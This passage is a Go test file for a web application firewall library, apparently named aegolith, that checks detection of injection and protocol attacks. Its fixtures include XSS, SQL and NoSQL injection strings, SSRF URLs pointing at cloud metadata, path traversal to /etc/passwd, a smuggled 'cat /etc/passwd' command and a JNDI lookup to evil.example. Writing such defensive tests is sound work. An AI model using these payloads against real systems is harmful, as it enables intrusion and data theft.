		if el > time.Second*raceSlowdown {
			t.Fatalf("%s took %v", name, el)
		}
		if d.Err != nil {
			t.Fatalf("%s: %v", name, d.Err)
		}
	}
}

// Legit traffic over MaxFields is raw-scanned without false positives.
func TestInspectLegitLargeJSONAllowed(t *testing.T) {
	var b strings.Builder
	b.WriteString(`{"items":[`)
	for i := range 600 {
		if i > 0 {
			b.WriteString(",")
		}
		fmt.Fprintf(&b, `{"sku":"SKU-%04d","qty":%d,"price":12.50,"note":"Gate code 1234 & leave at door; thanks!","url":"https://cdn.example.com/p/%d.png"}`, i, i%5+1, i)
	}
	b.WriteString(`]}`)
	fw := mustNew(t, aegolith.Config{})
	d := fw.Inspect(postJSON("/api/v1/orders/import", b.String()))
	mustHave(t, d, "AEG-PROTO-010", "body")
	if d.Action != aegolith.ActionAllow {
		t.Fatalf("legit large body blocked: %v", ruleIDs(d))
	}
}

func multipartBody(t *testing.T, fn func(w *multipart.Writer)) (string, string) {
	t.Helper()
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	fn(w)
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.String(), w.FormDataContentType()
}

func TestInspectMultipartFileNotScanned(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	body, ct := multipartBody(t, func(w *multipart.Writer) {
		_ = w.WriteField("title", "my avatar")
		fw, _ := w.CreateFormFile("upload", "page.html")
		_, _ = fw.Write([]byte("<script>alert(document.cookie)</script> ' OR '1'='1"))
	})
	d := fw.Inspect(withBody("POST", "/api/v1/uploads", ct, body))
	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
		t.Fatalf("file part scanned: %+v", d)
	}
	// Non-file parts are scanned.
	body, ct = multipartBody(t, func(w *multipart.Writer) {
		_ = w.WriteField("title", "<script>alert(1)</script>")
	})
	d = fw.Inspect(withBody("POST", "/api/v1/uploads", ct, body))
	mustHave(t, d, "AEG-XSS-001", "form.title")
}

// Ruling 4: a long multipart value raises AEG-PROTO-011 and is scanned in
// windows like any other value.
func TestInspectMultipartTruncated(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
	body, ct := multipartBody(t, func(w *multipart.Writer) {
		_ = w.WriteField("bio", strings.Repeat("a", 9000)+"<script>alert(1)</script>")
	})
	d := fw.Inspect(withBody("POST", "/u", ct, body))
	if m := mustHave(t, d, "AEG-PROTO-011", "form.bio"); m.Action != aegolith.ActionMonitor {
		t.Fatalf("%+v", m)
	}
	mustHave(t, d, "AEG-XSS-001", "form.bio")
}

func qpMultipart(t *testing.T, name, filename, encoded string) (string, string) {
	t.Helper()
	return multipartBody(t, func(w *multipart.Writer) {
		h := textproto.MIMEHeader{}
		disp := `form-data; name="` + name + `"`
		if filename != "" {
			disp += `; filename="` + filename + `"`
		}
		h.Set("Content-Disposition", disp)
		h.Set("Content-Transfer-Encoding", "quoted-printable")
		pw, err := w.CreatePart(h)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = pw.Write([]byte(encoded))
	})
}

// Fix-round ruling 1: quoted-printable parts are decoded like net/http's
// ReadForm decodes them before they are scanned; file parts stay unscanned.
func TestInspectMultipartQuotedPrintable(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	body, ct := qpMultipart(t, "title", "", "=3Cscript=3Ealert(1)=3C/script=3E")
	mustHave(t, fw.Inspect(withBody("POST", "/s", ct, body)), "AEG-XSS-001", "form.title")
	body, ct = qpMultipart(t, "q", "", "1=27 OR =271=27=3D=271")
	mustHave(t, fw.Inspect(withBody("POST", "/s", ct, body)), "AEG-SQLI-001", "form.q")
	body, ct = qpMultipart(t, "up", "a.html", "=3Cscript=3Ealert(1)=3C/script=3E")
	if d := fw.Inspect(withBody("POST", "/s", ct, body)); d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
		t.Fatalf("QP file part scanned: %v", ruleIDs(d))
	}
}

// Fix-round ruling 2: multipart field names get the NoSQL operator-key rule
// like url-encoded form keys.
func TestInspectMultipartOperatorKey(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	body, ct := multipartBody(t, func(w *multipart.Writer) { _ = w.WriteField("email[$ne]", "x") })
	d := fw.Inspect(withBody("POST", "/s", ct, body))
	mustHave(t, d, "AEG-NOSQL-002", "form.email[$ne]")
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("%+v", d)
	}
}

// Ruling 5: header keys are canonicalized before protocol checks.
func TestInspectNonCanonicalHeaderKeys(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	r := get("/a")
	r.Method = "POST"
	r.Header = http.Header{"transfer-encoding": {"gzip, chunked"}}
	mustHave(t, fw.Inspect(r), "AEG-PROTO-006", "header.transfer-encoding")

	r = get("/a")
	r.Method = "POST"
	r.Header = http.Header{"content-type": {"application/xml"}}
	r.Body = []byte("<a/>")
	mustHave(t, fw.Inspect(r), "AEG-PROTO-002", "header.content-type")

	r = get("/a")
	r.Header = http.Header{"user-agent": {"Nikto/2.5.0"}}
	mustHave(t, fw.Inspect(r), "AEG-SCANNER-001", "header.user-agent")
}

func TestInspectPathRulesAndTrailingTraversal(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	mustHave(t, fw.Inspect(get("/.env")), "AEG-SCANNER-002", "path")
	mustHave(t, fw.Inspect(get("/config.php.bak")), "AEG-SCANNER-003", "path")
	mustHave(t, fw.Inspect(get("/api/v1/files/%2e%2e")), "AEG-PROTO-005", "path")
}

// Ruling 12: params are matched on the raw path and decoded afterwards, so
// %2F cannot split or forge a segment.
func TestInspectPathParamsDecodedAfterMatch(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{
		{Method: "GET", Path: "/api/v1/orders/:id", PathParams: map[string]aegolith.Field{"id": {Type: aegolith.TypeUUID}}},
		{Method: "GET", Path: "/api/v1/files/:name/meta"},
	}})
	d := fw.Inspect(get("/api/v1/orders/4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b"))
	if len(d.Matches) != 0 {
		t.Fatalf("valid uuid: %v", ruleIDs(d))
	}
	d = fw.Inspect(get("/api/v1/orders/a%2Fb"))
	mustNotHave(t, d, "AEG-ROUTE-001")
	mustHave(t, d, "AEG-SCHEMA-001", "path.id")

	d = fw.Inspect(get("/api/v1/files/x%2F..%2Fy/meta"))
	mustNotHave(t, d, "AEG-ROUTE-001")
	d = fw.Inspect(get("/api/v1/files/1%27%20OR%20%271%27%3D%271/meta"))
	mustHave(t, d, "AEG-SQLI-001", "path.name")
}

// Ruling 8: url-typed fields get SSRF (both rules) plus ScanText; text gets
// SSRF through ScanText.
func TestInspectSSRF(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{{
		Method: "POST", Path: "/api/v1/products",
		Body: map[string]aegolith.Field{"image_url": {Type: aegolith.TypeURL}, "description": {Type: aegolith.TypeText}},
	}}})
	d := fw.Inspect(postJSON("/api/v1/products", `{"image_url":"http://169.254.169.254/latest/meta-data/"}`))
	mustHave(t, d, "AEG-SSRF-001", "body.image_url")
	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"http://127.0.0.1:8080/admin"}`))
	mustHave(t, d, "AEG-SSRF-002", "body.image_url")
	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"https://cdn.example.com/a.png?x=%3Cscript%3Ealert(1)%3C/script%3E"}`))
	mustNotHave(t, d, "AEG-SCHEMA-001")
	mustHave(t, d, "AEG-XSS-001", "body.image_url")
	// A quote is not a URL byte: schema mismatch.
	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"https://cdn.example.com/a.png?x=1'"}`))
	mustHave(t, d, "AEG-SCHEMA-001", "body.image_url")
	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"https://cdn.example.com/a.png"}`))
	if len(d.Matches) != 0 {
		t.Fatalf("clean url: %v", ruleIDs(d))
	}
	d = fw.Inspect(postJSON("/api/v1/products", `{"description":"see http://10.0.0.5/internal"}`))
	mustHave(t, d, "AEG-SSRF-002", "body.description")
}

// Ruling 13: string, text, email and url get ScanText after validation;
// fully constrained types do not.
func TestInspectStringLikeTypesStillScanned(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{{
		Method: "POST", Path: "/api/v1/signup",
		Body: map[string]aegolith.Field{
			"email": {Type: aegolith.TypeEmail}, "name": {Type: aegolith.TypeString},
			"kind": {Type: aegolith.TypeEnum, Enum: []string{"a", "b"}},
		},
	}}})
	d := fw.Inspect(postJSON("/api/v1/signup", `{"email":"'or'1'='1'--@x.io"}`))
	mustNotHave(t, d, "AEG-SCHEMA-001")
	mustHave(t, d, "AEG-SQLI-001", "body.email")
	d = fw.Inspect(postJSON("/api/v1/signup", `{"name":"<script>alert(1)</script>"}`))
	mustHave(t, d, "AEG-XSS-001", "body.name")
	d = fw.Inspect(postJSON("/api/v1/signup", `{"email":"o'brien@example.com","name":"Mary O'Brien","kind":"a"}`))
	if len(d.Matches) != 0 {
		t.Fatalf("legit: %v", ruleIDs(d))
	}
}

// Ruling 14 (as amended): JSON non-strings for string-like types are
// schema mismatches; JSON null on a declared field is allowed, because
// optional fields are commonly sent as null.
func TestInspectJSONNonStringForStringType(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"note":5}`))
	mustHave(t, d, "AEG-SCHEMA-001", "body.note")
	if d.Action != aegolith.ActionBlock {
		t.Fatalf("%+v", d)
	}
	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"product_id":true}`))
	mustHave(t, d, "AEG-SCHEMA-001", "body.product_id")
	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":3,"note":null,"product_id":null}`))
	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
		t.Fatalf("null on declared fields must be allowed: %v", ruleIDs(d))
	}
}

// Fix-round ruling 3: an object or array (empty ones included) where a
// declared field expects a scalar is AEG-SCHEMA-001 (block).
func TestInspectContainerOnDeclaredField(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
	for body, field := range map[string]string{
		`{"qty":[5]}`:          "body.qty",
		`{"qty":[]}`:           "body.qty",
		`{"qty":{}}`:           "body.qty",
		`{"qty":{"a":1}}`:      "body.qty",
		`{"product_id":["x"]}`: "body.product_id",
		`{"note":{"x":"y"}}`:   "body.note",
	} {
		d := fw.Inspect(postJSON("/api/v1/cart/items", body))
		if m := mustHave(t, d, "AEG-SCHEMA-001", field); m.Action != aegolith.ActionBlock || d.Action != aegolith.ActionBlock {
			t.Fatalf("%s: %+v", body, d)
		}
	}
	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":null}`)); len(d.Matches) != 0 {
		t.Fatalf("null: %v", ruleIDs(d))
	}
	// Undeclared containers are not schema mismatches.
	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"meta":{}}`)); d.Action != aegolith.ActionAllow {
		t.Fatalf("undeclared container: %v", ruleIDs(d))
	}
}

func TestInspectUnknownFields(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"coupon":"SAVE10"}`))
	if d.Action != aegolith.ActionAllow || !d.Monitored {
		t.Fatalf("default monitor: %+v", d)
	}
	mustHave(t, d, "AEG-SCHEMA-002", "body.coupon")
	// Undeclared values are scanned as untyped.
	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"coupon":"1' OR '1'='1"}`))
	mustHave(t, d, "AEG-SQLI-001", "body.coupon")

	block := aegolith.ActionBlock
	r := cartRoute()
	r.UnknownFields = &block
	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{r}})
	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"coupon":"SAVE10"}`)); d.Action != aegolith.ActionBlock {
		t.Fatalf("route block: %+v", d)
	}
	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}, UnknownFields: aegolith.ActionBlock})
	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"coupon":"SAVE10"}`)); d.Action != aegolith.ActionBlock {
		t.Fatalf("config block: %+v", d)
	}
	// Query on a route that declares no query map is not schema-checked.
	if d := fw.Inspect(withBody("POST", "/api/v1/cart/items?utm=x", "application/json", `{"qty":1}`)); len(d.Matches) != 0 {
		t.Fatalf("undeclared location: %v", ruleIDs(d))
	}
}

func TestInspectJSONKeysAndSession(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	mustHave(t, fw.Inspect(postJSON("/login", `{"email":{"$ne":null}}`)), "AEG-NOSQL-001", "body.email.$ne")
	mustHave(t, fw.Inspect(postJSON("/x", `{"__proto__":{"admin":true}}`)), "AEG-PPOLL-001", "body.__proto__")
	mustHave(t, fw.Inspect(get("/login?email[$ne]=x")), "AEG-NOSQL-002", "query.email[$ne]")
	mustHave(t, fw.Inspect(get("/x?PHPSESSID=abc")), "AEG-SESSION-001", "query.PHPSESSID")
	// {"a":"a"}: the key and the equal value are both seen correctly.
	if d := fw.Inspect(postJSON("/x", `{"constructor":"constructor"}`)); len(d.Matches) != 1 {
		t.Fatalf("key/value: %v", ruleIDs(d))
	}
}

func TestInspectCookiesAndHeaders(t *testing.T) {
	fw := mustNew(t, aegolith.Config{InspectHeaders: []string{"x-search-term"}})
	r := get("/a")
	r.Header.Set("Cookie", "sid=abc; pref=<script>alert(1)</script>")
	mustHave(t, fw.Inspect(r), "AEG-XSS-001", "cookie.pref")

	r = get("/a")
	r.Header.Set("X-Search-Term", "1' OR '1'='1")
	mustHave(t, fw.Inspect(r), "AEG-SQLI-001", "header.x-search-term")

	r = get("/a")
	r.Header.Set("Referer", "https://shop.example/p?q=<script>alert(1)</script>")
	mustHave(t, fw.Inspect(r), "AEG-XSS-001", "header.referer")

	r = get("/a")
	r.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
	mustHave(t, fw.Inspect(r), "AEG-JNDI-001", "header.user-agent")
}

func TestInspectSnippetsRedactedAndDeduplicated(t *testing.T) {
	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
	payload := "1%27%20OR%20%271%27%3D%271%20--%20" + strings.Repeat("x", 200)
	d := fw.Inspect(get("/s?q=" + payload + "&q=" + payload + "&k%0Aey=1%27%20OR%20%271%27%3D%271"))
	n := 0
	for _, m := range d.Matches {
		if len(m.Snippet) > 64 || strings.ContainsAny(m.Snippet+m.Field, "\r\n") {
			t.Fatalf("unsafe match %+v", m)
		}
		if m.RuleID == "AEG-SQLI-001" && m.Field == "query.q" {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("query.q SQLi reported %d times: %v", n, ruleIDs(d))
	}
	mustHave(t, d, "AEG-SQLI-001", "query.k?ey")
}

func TestInspectNilSafety(t *testing.T) {
	fw := mustNew(t, aegolith.Config{})
	d := fw.Inspect(nil)
	if d.Action != aegolith.ActionAllow || d.Err == nil {
		t.Fatalf("nil request: %+v", d)
	}
	closed := false
	fw = mustNew(t, aegolith.Config{FailOpen: &closed})
	if d := fw.Inspect(nil); d.Action != aegolith.ActionBlock || d.Err == nil {
		t.Fatalf("nil request fail closed: %+v", d)
	}
	var nilFW *aegolith.Firewall
	if d := nilFW.Inspect(get("/")); d.Err == nil {
		t.Fatalf("nil firewall: %+v", d)
	}
	// A request with a nil header map works.
	if d := fw.Inspect(&aegolith.Request{Method: "GET", RawPath: "/a"}); d.Err != nil || d.Action != aegolith.ActionAllow {
		t.Fatalf("nil header: %+v", d)
	}
}

func corpusLike() []*aegolith.Request {
	ua := get("/api/v1/products")
	ua.Header.Set("User-Agent", "Nikto/2.5.0")
	cookie := get("/api/v1/me")
	cookie.Header.Set("Cookie", "sid=abc; theme=dark")
	return []*aegolith.Request{
		get(sqliSearch),
		get("/api/v1/products/search?q=milk+%26+bread"),
		get("/.git/config"),
		get("/api/v1/files/..%2f..%2fetc%2fpasswd"),
		ua,
		cookie,
		postJSON("/api/v1/cart/items", `{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2}`),
		postJSON("/api/v1/cart/items", `{"qty":"1 OR 1=1","note":"<script>alert(1)</script>"}`),
		postJSON("/api/v1/cart/items", `{"note":"x`),
		postJSON("/api/v1/login", `{"email":{"$gt":""},"password":"x"}`),
		withBody("POST", "/api/v1/reviews", "application/x-www-form-urlencoded", "text=nice;+cat+/etc/passwd"),
		get("/api/v1/unknown?redirect=http://169.254.169.254/"),
	}
}

func TestInspectConcurrent(t *testing.T) {
	block := aegolith.ActionBlock
	r := cartRoute()
	r.UnknownFields = &block
	fw := mustNew(t, aegolith.Config{
		Routes:     []aegolith.Route{r, {Method: "GET", Path: "/api/v1/products/search", Query: map[string]aegolith.Field{"q": {Type: aegolith.TypeText}}}},
		Exclusions: []aegolith.Exclusion{{Rule: "AEG-SESSION-*"}},
	})
	reqs := corpusLike()
	want := make([]aegolith.Decision, len(reqs))
	for i, r := range reqs {
		want[i] = fw.Inspect(r)
	}
	const workers, iters = 64, 1000
	var wg sync.WaitGroup
	errs := make(chan string, workers)
	for w := range workers {
		wg.Go(func() {
			for i := range iters {
				k := (w + i) % len(reqs)
				if got := fw.Inspect(reqs[k]); !reflect.DeepEqual(got, want[k]) {
					errs <- fmt.Sprintf("request %d: got %+v want %+v", k, got, want[k])
					return
				}
			}
		})
	}
	wg.Wait()
	close(errs)
	for e := range errs {
		t.Fatal(e)
	}
}

func TestLoadConfig(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "aegolith.json")
	const doc = `{
  "mode": "monitor",
  "allow_xml": true,
  "limits": {"max_fields": 50, "max_value_len": 4096},
  "routes": [{"method": "POST", "path": "/api/v1/cart/items",
              "body": {"qty": {"type": "int", "min": 1, "max": 99}},
              "unknown_fields": "block"}],
  "unknown_route": "monitor",
  "unknown_fields": "monitor",
  "exclusions": [{"rule": "AEG-SQLI-*", "route": "GET /api/v1/products/search", "field": "query.q"}],
  "rule_actions": {"scanner": "monitor"},
  "inspect_headers": ["X-Search"],
  "fail_open": false
}`
	if err := os.WriteFile(path, []byte(doc), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := aegolith.LoadConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Mode != aegolith.ModeMonitor || !cfg.AllowXML || cfg.Limits.MaxFields != 50 || len(cfg.Routes) != 1 ||
		*cfg.Routes[0].UnknownFields != aegolith.ActionBlock || cfg.RuleActions["scanner"] != aegolith.ActionMonitor ||
		cfg.FailOpen == nil || *cfg.FailOpen || cfg.Exclusions[0].Field != "query.q" || cfg.InspectHeaders[0] != "X-Search" {
		t.Fatalf("loaded %+v", cfg)
	}
	if _, err := aegolith.New(cfg); err != nil {
		t.Fatalf("New(loaded): %v", err)
	}
	if _, err := aegolith.LoadConfig(filepath.Join(dir, "missing.json")); err == nil {
		t.Fatal("missing file should error")
	}
}

func TestLoadConfigRejectsUnknownKeys(t *testing.T) {
	dir := t.TempDir()
	for name, doc := range map[string]string{
		"top":      `{"mode":"enforce","modee":"x"}`,
		"nested":   `{"routes":[{"method":"GET","path":"/a","bodyy":{}}]}`,
		"limits":   `{"limits":{"max_feilds":1}}`,
		"bad enum": `{"mode":"off"}`,
		"trailing": `{"mode":"enforce"} {"mode":"monitor"}`,
	} {
		path := filepath.Join(dir, strings.ReplaceAll(name, " ", "_")+".json")
		if err := os.WriteFile(path, []byte(doc), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := aegolith.LoadConfig(path); err == nil {
			t.Errorf("%s: expected error", name)
		}
	}
}

func TestNewValidates(t *testing.T) {
	for name, cfg := range map[string]aegolith.Config{
		"bad route pattern":    {Routes: []aegolith.Route{{Method: "GET", Path: "no-slash"}}},
		"bad field type":       {Routes: []aegolith.Route{{Method: "GET", Path: "/a", Query: map[string]aegolith.Field{"q": {Type: "nope"}}}}},
		"bad mode":             {Mode: aegolith.Mode(9)},
		"bad unknown route":    {UnknownRoute: aegolith.Action(9)},
		"bad unknown fields":   {UnknownFields: aegolith.Action(-1)},
		"bad rule action":      {RuleActions: map[string]aegolith.Action{"sqli": aegolith.Action(5)}},
		"unknown rule key":     {RuleActions: map[string]aegolith.Action{"sqlinjection": aegolith.ActionMonitor}},
		"empty exclusion rule": {Exclusions: []aegolith.Exclusion{{Route: "*"}}},
		"bad exclusion route":  {Exclusions: []aegolith.Exclusion{{Rule: "sqli", Route: "/no-method"}}},
		"bad exclusion field":  {Exclusions: []aegolith.Exclusion{{Rule: "sqli", Field: "q"}}},
		"negative limit":       {Limits: aegolith.Limits{MaxFields: -1}},
		"empty header":         {InspectHeaders: []string{" "}},
		"empty method":         {AllowedMethods: []string{""}},
	} {
		if _, err := aegolith.New(cfg); err == nil {
			t.Errorf("%s: expected error", name)
		}
	}
	if _, err := aegolith.New(aegolith.Config{}); err != nil {
		t.Fatalf("zero config: %v", err)
	}
}

func TestNewCopiesConfig(t *testing.T) {
	cfg := aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-*"}}, RuleActions: map[string]aegolith.Action{}}
	fw := mustNew(t, cfg)
	cfg.Exclusions[0].Rule = "AEG-NONE-*"
	cfg.RuleActions["sqli"] = aegolith.ActionBlock
	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionAllow {
		t.Fatalf("firewall saw a later config change: %+v", d)
	}
}
